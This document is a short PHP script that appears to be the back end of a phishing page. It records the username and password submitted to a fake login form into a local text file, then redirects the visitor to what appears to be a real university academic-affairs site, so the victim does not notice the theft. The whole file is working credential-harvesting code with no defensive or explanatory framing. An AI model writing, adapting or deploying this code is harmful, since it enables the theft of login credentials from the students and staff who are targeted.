<?php  header("Content-Type:  text/html;  charset=utf-8");
if( $_POST["submit"] == "登录"){
$myfile = fopen("zc.txt", "a");
fwrite($myfile,  "user：");
fwrite($myfile,$_POST["user"]); 
fwrite($myfile, "\n\r");
fwrite($myfile,  "password：");
fwrite($myfile,$_POST ["pwd"]);
fwrite($myfile, "\n\r");

 
header('Location: http://jws.hebiace.edu.cn');
}

?>


